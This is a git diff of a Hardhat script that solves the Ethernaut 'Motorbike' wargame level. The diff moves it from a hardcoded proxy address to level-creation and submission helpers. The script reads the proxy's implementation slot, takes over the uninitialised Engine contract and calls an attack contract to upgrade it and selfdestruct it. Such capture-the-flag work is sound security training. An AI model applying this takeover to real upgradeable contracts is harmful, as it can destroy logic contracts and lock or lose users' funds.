@@ -3,12 +3,13 @@ import { ethers } from 'ethers';
 import { BigNumber, Signer, BytesLike } from "ethers";
 import { getSigner } from "./signer";
 import { AttackMotorBike__factory, Engine__factory, MotorbikeAttack__factory } from "../typechain";
-
+import { createLevel, submitLevel } from './utils';
+import hre from "hardhat";
 async function main() {
   // Ok so the ethernaut webversion contract give wrong address. The address it give is the proxy contract. Not the wallet contract.
   // the proxy keep delegate view call to the wallet contract. 
-  const proxyAddress = "0xccfbbf10394492006f834fe05c9D4ab941c3bD8e";
   const signer = getSigner();
+  const level = await createLevel(signer, "Motorbike");
   const player = await signer.getAddress();
   const _IMPLEMENTATION_SLOT =
     "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
@@ -18,7 +19,7 @@ async function main() {
   // await OriginalAnswer();
 
   async function OriginalAnswer(){
-    const engineAddress = "0x" + (await signer.provider?.getStorageAt(proxyAddress, _IMPLEMENTATION_SLOT))?.substring("0x000000000000000000000000".length);
+    const engineAddress = "0x" + (await signer.provider?.getStorageAt(level, _IMPLEMENTATION_SLOT))?.substring("0x000000000000000000000000".length);
     console.log("engine address:", engineAddress);
     const attacker = await (new MotorbikeAttack__factory(signer)).deploy(engineAddress);
     console.log("attacker address:", attacker.address);
@@ -30,16 +31,16 @@ async function main() {
   }
 
   async function MyAnswer() {
-    console.log(await signer.provider?.getStorageAt(proxyAddress, 0));
-    console.log(await signer.provider?.getStorageAt(proxyAddress, 1));
-    console.log(await signer.provider?.getStorageAt(proxyAddress, 2));
-    console.log(await signer.provider?.getStorageAt(proxyAddress, 3));
-    console.log("implement:", await signer.provider?.getStorageAt(proxyAddress, _IMPLEMENTATION_SLOT));
+    console.log(await signer.provider?.getStorageAt(level, 0));
+    console.log(await signer.provider?.getStorageAt(level, 1));
+    console.log(await signer.provider?.getStorageAt(level, 2));
+    console.log(await signer.provider?.getStorageAt(level, 3));
+    console.log("implement:", await signer.provider?.getStorageAt(level, _IMPLEMENTATION_SLOT));
 
     // The proxy store all storage. 
     // But power to change implementation belong to the logic side.
     // Our goals is to selfdestruct the engine.
-    const engineAddress = "0x" + (await signer.provider?.getStorageAt(proxyAddress, _IMPLEMENTATION_SLOT))?.substring("0x000000000000000000000000".length);
+    const engineAddress = "0x" + (await signer.provider?.getStorageAt(level, _IMPLEMENTATION_SLOT))?.substring("0x000000000000000000000000".length);
     console.log("engine address:", engineAddress);
     const engine = (new Engine__factory(signer)).attach(engineAddress);
     // The engine have not called init. We can take over easily.
@@ -57,6 +58,7 @@ async function main() {
     console.log("upgrade and die");
     await (await attack.UpgradeAndCallDestroy(engineAddress, { gasLimit: 1000000 })).wait();
   }
+  await submitLevel(signer, level);
 }
 
 main()
